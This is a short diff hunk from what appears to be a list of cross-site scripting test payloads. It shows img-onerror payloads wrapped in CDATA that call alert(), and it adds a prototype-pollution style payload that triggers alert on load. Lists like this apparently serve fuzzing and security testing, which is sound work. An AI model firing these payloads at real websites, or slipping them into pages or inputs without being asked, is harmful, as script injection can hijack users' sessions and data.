@@ -498,7 +498,7 @@ for old browsers
 <![CDATA[<img src="broken" onerro"alert(1)">]]>
 <![CDATA[><img src="broken" onerror="alert(1)">]]>
 
-
+/#__proto_[onload]=alert(11)
 
 
 
